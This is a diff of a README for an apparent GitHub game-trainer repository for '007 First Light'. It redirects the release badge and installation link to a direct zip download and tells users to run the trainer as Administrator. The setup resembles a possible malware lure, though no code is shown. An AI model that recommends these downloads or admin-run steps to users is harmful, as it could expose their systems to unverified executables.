@@ -8,7 +8,7 @@
     <img src="https://img.shields.io/github/downloads/cytan544-spec/007-First-Light-Trainer/total?style=for-the-badge&color=gold" alt="Downloads"/>
   </a>
   
-  <a href="https://github.com/cytan544-spec/007-First-Light-Trainer/releases/latest">
+  <a href="https://github.com/cytan544-spec/007-First-Light-Trainer/releases/download/007-First-Light-Trainer/007FirstLightTrainer.zip">
     <img src="https://img.shields.io/github/v/release/cytan544-spec/007-First-Light-Trainer?style=for-the-badge&color=crimson" alt="Latest Release"/>
   </a>
   
@@ -175,7 +175,7 @@ Full invisibility + noclip combined with action recording & playback (macros). I
 
 ## Installation
 
-1. Download the latest version from the [Releases](https://github.com/cytan544-spec/007-First-Light-Trainer/releases/download/007-First-Light-Trainer/007FirstLightTrainer.exe) page
+1. Download the latest version from the [Releases](https://github.com/cytan544-spec/007-First-Light-Trainer/releases/download/007-First-Light-Trainer/007FirstLightTrainer.zip) page
 2. Launch the game
 3. Run the trainer as Administrator
 4. Enjoy
